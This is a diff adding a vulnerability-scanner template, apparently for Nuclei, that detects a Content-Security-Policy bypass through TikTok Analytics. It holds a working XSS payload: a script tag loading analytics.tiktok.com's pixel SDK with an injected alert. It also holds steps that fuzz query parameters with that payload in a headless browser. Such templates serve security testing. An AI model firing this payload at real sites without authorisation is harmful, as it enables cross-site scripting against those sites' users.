@@ -1,0 +1,55 @@
+id: tiktok-analytics-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - TikTok Analytics
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,tiktok-analytics,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "tiktok.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: tiktok_analytics_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://analytics.tiktok.com/i18n/pixel/sdk.js?sdkid=%22-alert`1`-%22"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "tiktok_analytics_csp_xss == true"
+# digest: 490a0046304402206ae46fb8a86deac35ecc086851f1fa544fb75378179b037266444287a4eb728502201b0a4c8385a8010f03269d88ac971db3f897abde8df85f4394a1b5e1dd7871ee:922c64590222798bb761d5b6d8e72950
